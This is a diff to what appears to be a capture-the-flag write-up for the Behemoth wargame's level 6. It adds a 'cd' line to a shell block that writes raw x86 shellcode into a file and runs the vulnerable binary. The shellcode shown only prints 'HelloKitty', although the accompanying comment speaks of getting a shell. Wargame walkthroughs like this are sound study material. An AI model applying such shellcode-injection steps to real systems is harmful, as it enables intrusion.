@@ -88,6 +88,7 @@ Now, to make `shellcode.txt` with our shellcode we need to compile it to a strin
 To make `behemoth6_reader` run our shellcode we need to simply run a few shell commands:
 ```sh
 mkdir /tmp/6 # create a new directory in which we can write out shellcode.txt file
+cd /tmp/6
 printf "\x83\xEC\x20\x6A\x00\x68\x74\x79\x00\x00\x68\x6F\x4B\x69\x74\x68\x48\x65\x6C\x6C\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\x89\xE1\xBA\x0A\x00\x00\x00\x31\xF6\x31\xFF\x31\xED\xCD\x80" > shellcode.txt # print the compiled shellcode into shellcode.txt
 /behemoth/behemoth6 # run behemoth6 and get a shell!
 ```
